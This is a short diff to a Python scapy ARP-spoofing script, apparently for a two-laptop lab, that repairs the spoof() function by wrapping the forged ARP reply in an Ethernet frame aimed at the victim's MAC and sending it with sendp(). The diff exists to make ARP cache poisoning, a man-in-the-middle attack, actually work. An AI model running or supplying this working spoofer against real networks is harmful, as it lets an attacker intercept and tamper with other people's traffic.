@@ -11,8 +11,11 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     if target_mac:
-        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-        scapy.send(packet, verbose=False)
+        # THE FIX: Explicitly append the Ethernet layer targeting the victim's MAC
+        packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        
+        # THE FIX: Use sendp() for Layer 2 transmission instead of send()
+        scapy.sendp(packet, verbose=False)
 
 target_ip = "192.168.1.X"   # <-- LAPTOP 1 (CLIENT) KA IP
 gateway_ip = "192.168.1.Y"  # <-- LAPTOP 2 (SERVER) KA IP
